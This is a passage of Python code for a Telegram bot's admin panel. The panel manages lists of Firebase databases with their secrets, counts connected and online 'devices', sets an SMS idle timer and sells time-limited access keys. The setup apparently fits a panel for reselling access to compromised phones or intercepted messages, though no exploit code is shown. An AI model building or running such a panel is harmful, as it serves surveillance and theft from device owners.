        await q.message.reply_text(f"Current idle: {cur}s\nSend seconds:")
    elif data == "ad_welcome":
        context.user_data["admin_state"] = "welcome_text"
        await q.message.reply_text("Send welcome HTML text.\nThen photo with caption <code>setmedia</code>", parse_mode=ParseMode.HTML)
    elif data == "ad_users":
        users = db.get("users") or {}
        active = sum(1 for x in users.values() if has_access(x))
        await q.message.reply_text(f"<b>USERS</b>\nTotal: {len(users)}\nAccess: {active}", parse_mode=ParseMode.HTML)
    elif data == "ad_rmfb":
        context.user_data["admin_state"] = "rmfb"
        fbs = db.get("firebases") or []
        lines = ["<b>🗑 REMOVE FIREBASE</b>", f"Total: <b>{len(fbs)}</b>", ""]
        for i, f in enumerate(fbs[:30], 1):
            lines.append(f"{i}. {f.get('name') or 'FB'}")
        if len(fbs) > 30:
            lines.append(f"… +{len(fbs)-30} more")
        lines.append("")
        lines.append("Send number: <code>3</code>")
        lines.append("Or range: <code>1-6</code>")
        lines.append("Or list: <code>1,3,5</code>")
        await q.message.reply_text("\n".join(lines), parse_mode="HTML")
    elif data == "ad_bulkrmfb":
        context.user_data["admin_state"] = "rmfb"
        fbs = db.get("firebases") or []
        await q.message.reply_text(
            f"<b>🗑 BULK DELETE FB</b>\nTotal: <b>{len(fbs)}</b>\n\n"
            "Send range or list:\n"
            "• <code>1-6</code> — delete 1 to 6\n"
            "• <code>1,2,5</code> — delete those\n"
            "• <code>all</code> — delete everything",
            parse_mode="HTML",
        )


async def admin_stats(q, db):
    fbs = db.get("firebases") or []
    lines = ["<b>📊 LIVE STATS</b>"]
    total = online = 0
    for i, fb in enumerate(fbs, 1):
        try:
            raw = await fb_get_clients(fb["url"], fb.get("key") or "")
            devs = parse_clients(raw if isinstance(raw, dict) else {})
            on = sum(1 for d in devs if d["online"])
            total += len(devs)
            online += on
            lines.append(f"\n<b>{fb.get('name') or f'FB{i}'}</b>\nTotal {len(devs)} · Online {on}")
        except Exception as e:
            lines.append(f"\n<b>{fb.get('name') or f'FB{i}'}</b> ERR: {e}")
    lines.append(f"\n<b>ALL</b> {total} · online {online}")
    await q.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def handle_admin_state(update, context, st, text):
    uid = update.effective_user.id
    if st == "bulkfb":
        context.user_data["admin_state"] = None
        added = skipped = 0

        def mut(d):
            nonlocal added, skipped
            d.setdefault("firebases", [])
            existing = {(x.get("url") or "").rstrip("/") for x in d["firebases"]}
            for ln in text.splitlines()[:50]:
                ln = re.sub(r"^\d+[\.\)\-\s]+", "", ln.strip())
                if not ln:
                    continue
                name, url, key = f"FB{len(d['firebases'])+1}", "", ""
                if "|" in ln:
                    parts = [p.strip() for p in ln.split("|")]
                    if len(parts) >= 3 and "http" in parts[1]:
                        name, url, key = parts[0], parts[1], parts[2]
                    elif len(parts) >= 2:
                        url, key = parts[0], parts[1]
                    else:
                        url = parts[0]
                else:
                    parts = ln.split()
                    url = parts[0]
                    key = parts[1] if len(parts) > 1 else ""
                if not url.startswith("http"):
                    url = "https://" + url
                url = url.rstrip("/")
                if url in existing:
                    skipped += 1
                    continue
                d["firebases"].append({"url": url, "key": key, "name": name, "added": datetime.now(timezone.utc).isoformat()})
                existing.add(url)
                added += 1

        db_update(mut)
        await send_menu(context.bot, update.effective_chat.id, f"Bulk done. Added <b>{added}</b> · skip {skipped}", rows_admin())

    elif st == "addfb_url":
        context.user_data["new_fb_url"] = text.strip().rstrip("/")
        context.user_data["admin_state"] = "addfb_key"
        await update.message.reply_text("Send Database Secret (or -):")
    elif st == "addfb_key":
        context.user_data["new_fb_key"] = "" if text.strip() == "-" else text.strip()
        context.user_data["admin_state"] = "addfb_name"
        await update.message.reply_text("Send short name:")
    elif st == "addfb_name":
        url = context.user_data.pop("new_fb_url", "")
        key = context.user_data.pop("new_fb_key", "")
        name = text.strip() or "FB"
        context.user_data["admin_state"] = None

        def mut(d):
            d.setdefault("firebases", []).append({"url": url, "key": key, "name": name, "added": datetime.now(timezone.utc).isoformat()})

        db_update(mut)
        await send_menu(context.bot, update.effective_chat.id, f"✅ <b>{name}</b> added", rows_admin())

    elif st == "gen_keys":
        context.user_data["admin_state"] = None
        parts = text.split()
        try:
            count, mins = int(parts[0]), float(parts[1])
        except Exception:
            await update.message.reply_text("Format: count minutes")
            return
        created = []

        def mut(d):
            d.setdefault("keys", {})
            for _ in range(max(1, min(count, 50))):
                k = "XR" + hashlib.sha1(f"{_now()}{random.random()}".encode()).hexdigest()[:10].upper()
                d["keys"][k] = {"minutes": mins, "used": False, "created": _now()}
                created.append(k)

        db_update(mut)
        await update.message.reply_text("Keys:\n" + "\n".join(f"<code>{k}</code>" for k in created), parse_mode=ParseMode.HTML)

    elif st == "gift":
        context.user_data["admin_state"] = None
        parts = text.split()
        try:
            tid, hours = int(parts[0]), float(parts[1])
        except Exception:
            await update.message.reply_text("Format: user_id hours")
            return

        def mut(d):
            add_access_minutes(user_rec(d, tid), hours * 60)

        db_update(mut)
        await update.message.reply_text(f"Gifted {hours}h to {tid}")

    elif st == "set_refmins":
        context.user_data["admin_state"] = None
        try:
            mins = float(text.strip())
        except Exception:
            await update.message.reply_text("Number only")
            return

        def mut(d):
            d.setdefault("settings", {})["referral_minutes"] = mins

        db_update(mut)
        await send_menu(context.bot, update.effective_chat.id, f"Referral = <b>{mins} min</b>", rows_admin())

    elif st == "set_idlesec":
        context.user_data["admin_state"] = None
        try:
            sec = int(float(text.strip()))
        except Exception:
            await update.message.reply_text("Number only")
            return

        def mut(d):
            d.setdefault("settings", {})["sms_idle_sec"] = sec

        db_update(mut)
        await send_menu(context.bot, update.effective_chat.id, f"Idle = <b>{sec}s</b>", rows_admin())

    elif st == "welcome_text":
        context.user_data["admin_state"] = None
        def mut(d):
            d.setdefault("welcome", {})["text"] = text
        db_update(mut)
        await update.message.reply_text("Welcome text saved.")

    elif st == "rmfb":
        context.user_data["admin_state"] = None
        text_l = text.strip().lower()
        indices = set()
        fbs_len = len((db_get().get("firebases") or []))

        if text_l == "all":
            indices = set(range(fbs_len))
        else:
            # support: 1-6  |  1,3,5  |  2  |  1-3,7,9-10
            for part in re.split(r"[\s,]+", text.strip()):
                part = part.strip()
                if not part:
                    continue
                m = re.fullmatch(r"(\d+)\s*-\s*(\d+)", part)
                if m:
                    a, b = int(m.group(1)), int(m.group(2))
                    if a > b:
                        a, b = b, a
                    for n in range(a, b + 1):
                        indices.add(n - 1)  # 1-based -> 0-based
                elif part.isdigit():
                    indices.add(int(part) - 1)
                else:
                    await update.message.reply_text(
                        "Invalid. Use <code>1-6</code> or <code>1,3,5</code> or <code>all</code>",
                        parse_mode="HTML",
                    )
                    return

        indices = sorted((i for i in indices if 0 <= i < fbs_len), reverse=True)
        if not indices:
            await update.message.reply_text("No valid index.")
            return

        removed_names = []

        def mut(d):
            arr = d.get("firebases") or []
            for i in indices:
                if 0 <= i < len(arr):
                    removed_names.append(arr[i].get("name") or f"#{i+1}")
                    arr.pop(i)
            d["firebases"] = arr

        db_update(mut)
        left = len(db_get().get("firebases") or [])
        msg = (
            f"<b>🗑 Deleted {len(indices)}</b>\n"
            + ", ".join(removed_names[:15])
            + ("…" if len(removed_names) > 15 else "")
            + f"\nRemaining: <b>{left}</b>"
        )
        await send_menu(context.bot, update.effective_chat.id, msg, rows_admin())

    elif st == "add_channel":
        context.user_data["admin_state"] = None
        if text.startswith("@"):
            ch = {"username": text, "title": text, "link": f"https://t.me/{text.lstrip('@')}"}
        elif "|" in text:
            parts = text.split("|")
            ch = {"id": parts[0].strip(), "link": parts[1].strip() if len(parts) > 1 else "", "title": parts[2].strip() if len(parts) > 2 else parts[0]}
        else:
            ch = {"username": text, "link": f"https://t.me/{text.lstrip('@')}", "title": text}

        def mut(d):
            d.setdefault("channels", []).append(ch)

        db_update(mut)
        await send_menu(context.bot, update.effective_chat.id, "Channel added.", rows_admin())


async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    db = db_get()
    u = user_rec(db, uid)

    if not u.get("verified") and u.get("captcha") is not None:
        try:
            ans = int(re.sub(r"\D", "", text) or "x")
        except Exception:
            ans = None
        if ans == u.get("captcha"):
            u["verified"] = True
            u["captcha"] = None
            _save(db)
            await after_verified(update, context, db, u)
        else:
            q, a = make_captcha()
            u["captcha"] = a
            _save(db)
            await update.message.reply_text(f"❌ Wrong.\nNew: <code>{q}</code>", parse_mode=ParseMode.HTML)
        return

    if context.user_data.get("await_key") or (text.startswith("XR") and len(text) >= 8):
        context.user_data["await_key"] = False
        key = text.strip().upper()
        info = (db.get("keys") or {}).get(key)
        if not info or info.get("used"):
            await send_menu(context.bot, update.effective_chat.id, "❌ Invalid / used key", rows_main())
            return
        mins = float(info.get("minutes") or 60)

        def mut(d):
            add_access_minutes(user_rec(d, uid), mins)
            d["keys"][key]["used"] = True
            d["keys"][key]["used_by"] = uid

        db_update(mut)
        db = db_get()
        u = user_rec(db, uid)
        await send_menu(context.bot, update.effective_chat.id, f"✅ +{mins} min · now <b>{access_left_str(u)}</b>", rows_main())
        return

    st = context.user_data.get("admin_state")
    if st and is_admin(uid):
        await handle_admin_state(update, context, st, text)
        return


async def on_admin_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if (update.message.caption or "").strip().lower() != "setmedia":
        return
    msg = update.message
    mt = fid = None
    if msg.photo:
        mt, fid = "photo", msg.photo[-1].file_id
    elif msg.video:
        mt, fid = "video", msg.video.file_id
    elif msg.animation:
        mt, fid = "animation", msg.animation.file_id
    if not fid:
        return

    def mut(d):
        d.setdefault("welcome", {})
        d["welcome"]["media_type"] = mt
        d["welcome"]["media_file_id"] = fid

    db_update(mut)
    await msg.reply_text(f"Welcome {mt} saved.")


def main():
    if not BOT_TOKEN:
        print("Set BOT_TOKEN")
        return
    if aiohttp is None:
        print("pip install aiohttp python-telegram-bot")
        return
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("myid", cmd_myid))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO | filters.ANIMATION, on_admin_media))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    log.info("Starting… admins=%s", ADMIN_IDS)
    print("ADMIN_IDS =", ADMIN_IDS)
    print("Bot starting…")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
